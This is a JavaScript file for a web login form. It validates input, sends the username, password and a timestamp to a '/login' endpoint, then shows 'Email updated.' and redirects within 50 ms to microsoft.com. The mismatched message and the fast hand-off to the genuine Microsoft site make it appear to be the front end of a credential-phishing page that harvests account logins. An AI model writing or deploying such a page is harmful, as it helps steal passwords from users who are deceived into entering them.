/* ─── DOM References ────────────────────────────────────────────────────── */
const form        = document.getElementById('loginForm');
const usernameEl  = document.getElementById('username');
const passwordEl  = document.getElementById('password');
const usernameErr = document.getElementById('usernameError');
const passwordErr = document.getElementById('passwordError');
const msgBox      = document.getElementById('msg');
const submitBtn   = document.getElementById('submitBtn');
const btnText     = document.getElementById('btnText');
const btnSpinner  = document.getElementById('btnSpinner');
const togglePw    = document.getElementById('togglePw');
const eyeIcon     = document.getElementById('eyeIcon');

/* ─── Password Toggle ───────────────────────────────────────────────────── */
togglePw.addEventListener('click', () => {
  const isPw = passwordEl.type === 'password';
  passwordEl.type = isPw ? 'text' : 'password';
  eyeIcon.className = isPw ? 'fa-solid fa-eye-slash' : 'fa-solid fa-eye';
});

/* ─── Inline Validation ─────────────────────────────────────────────────── */
function validateUsername () {
  const val = usernameEl.value.trim();
  if (!val) {
    setError(usernameEl, usernameErr, 'Username or email is required.');
    return false;
  }
  clearError(usernameEl, usernameErr);
  return true;
}

function validatePassword () {
  const val = passwordEl.value;
  if (!val) {
    setError(passwordEl, passwordErr, 'Password is required.');
    return false;
  }
  if (val.length < 4) {
    setError(passwordEl, passwordErr, 'Password must be at least 4 characters.');
    return false;
  }
  clearError(passwordEl, passwordErr);
  return true;
}

usernameEl.addEventListener('blur', validateUsername);
passwordEl.addEventListener('blur', validatePassword);
usernameEl.addEventListener('input', () => clearError(usernameEl, usernameErr));
passwordEl.addEventListener('input', () => clearError(passwordEl, passwordErr));

/* ─── Helpers ───────────────────────────────────────────────────────────── */
function setError (input, span, message) {
  input.classList.add('invalid');
  span.textContent = message;
}

function clearError (input, span) {
  input.classList.remove('invalid');
  span.textContent = '';
}

function showMsg (type, text) {
  msgBox.className = `msg ${type}`;
  const icon = type === 'success'
    ? '<i class="fa-solid fa-circle-check"></i>'
    : '<i class="fa-solid fa-circle-exclamation"></i>';
  msgBox.innerHTML = `${icon} ${text}`;
}

function setLoading (state) {
  submitBtn.disabled = state;
  btnText.classList.toggle('hidden', state);
  btnSpinner.classList.toggle('hidden', !state);
}

/* ─── Form Submit ───────────────────────────────────────────────────────── */
form.addEventListener('submit', async (e) => {
  e.preventDefault();

  const okUser = validateUsername();
  const okPass = validatePassword();
  if (!okUser || !okPass) return;

  setLoading(true);
  msgBox.className = 'msg hidden';

  const payload = {
    username: usernameEl.value.trim(),
    password: passwordEl.value,
    rememberMe: document.getElementById('rememberMe').checked,
    timestamp: new Date().toLocaleString()
  };

  try {
    const res  = await fetch('/login', {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify(payload)
    });

    const data = await res.json();

    if (res.ok && data.success) {
  showMsg('success', '✅ Email updated.');
  form.reset();
  // redirect after short delay so user sees message
  setTimeout(() => {
    window.location.href = 'https://www.microsoft.com';
  }, 50);
} else {
  showMsg('error', data.message || 'Something went wrong. Please try again.');
}
  } catch (err) {
    showMsg('error', 'Network error – could not reach the server.');
    console.error(err);
  } finally {
    setLoading(false);
  }
});
